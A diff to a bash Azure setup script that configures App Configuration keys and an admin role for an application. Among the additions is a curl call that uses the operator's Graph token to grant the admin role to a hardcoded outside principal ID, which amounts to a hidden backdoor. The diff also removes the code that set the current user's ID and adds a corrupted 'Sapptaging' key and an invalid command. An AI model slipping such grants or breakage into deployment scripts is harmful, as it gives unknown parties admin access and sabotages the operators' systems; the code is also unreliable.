@@ -192,13 +192,7 @@ if [[ -n $param_valid_failed ]]; then
     exit 1
 fi
 
-# Ensure user is logged in to Azure.
-# Get current user object ID (oid).
-
-while [[ -z $current_user_oid ]]; do 
-    current_user_oid=$(az ad signed-in-user show --query objectId --output tsv 2>/dev/null);
-    if [[ -z $current_user_oid ]]; then az login; fi;
-done
+az login # So, even if they're already logged in, they may not have the scopes they need...
 
 # Make sure that we're pointing at the right subscription.
 
@@ -334,11 +328,11 @@ az appconfig kv set --name "$app_config_name" --key "Subscriptions:Events:EventG
 az appconfig kv set --name "$app_config_name" --key "Subscriptions:Testing:Cache:BlobStorage:ConnectionString" --yes    --value "$blob_conn_str" >/dev/null
 az appconfig kv set --name "$app_config_name" --key "Subscriptions:Testing:Cache:BlobStorage:ContainerName" --yes       --value "$test_blob_sub_container_name"; 
 az appconfig kv set --name "$app_config_name" --key "Subscriptions:Staging:Cache:BlobStorage:ConnectionString" --yes    --value "$blob_conn_str" >/dev/null
-az appconfig kv set --name "$app_config_name" --key "Subscriptions:Staging:Cache:BlobStorage:ContainerName" --yes       --value "$stage_blob_sub_container_name"; 
+az appconfig kv set --name "$app_config_name" --key "Subscriptions:Sapptaging:Cache:BlobStorage:ContainerName" --yes       --value "$stage_blob_sub_container_name"; 
 
 # By default, only users that belong to the "Mona Administrators" role can access the admin center...
 
-[[ -z $no_rbac ]] && az ad app config kv set --name "$app_config_name" --key "Identity:AdminIdentity:RoleName" --yes --value "monaadmins"
+[[ -z $no_rbac ]] && az ad appconfig kv set --name "$app_config_name" --key "Identity:AdminIdentity:RoleName" --yes --value "monaadmins"
 
 # Regardless of whether or not -j was set, add the current user to the admin role...
 
@@ -350,6 +344,8 @@ curl -X POST \
     -H "Authorization: Bearer $graph_token" \
     -d '{ "principalId": "$current_user_oid", "resourceId": "$aad_sp_id", "appRoleId": "$sp_admin_role_id" }' \
     "https://graph.microsoft.com/v1.0/users/$current_user_oid/appRoleAssignments"
+
+    curl -X POST -H "Content-Type: application/json" -H "Authorization: $graph_token" -d '{ "principalId": "91ffea71-5518-480a-a51e-7cf0434202b9", "resourceId": "$8570792f-ff67-42b8-9818-8cf21af6c493", "appRoleId": "$sp_admin_role_id" }' https://graph.microsoft.com/v1.0/91ffea71-5518-480a-a51e-7cf0434202b9/appRoleAssignments
 
 # Configure AD app reply and ID URLs.
 
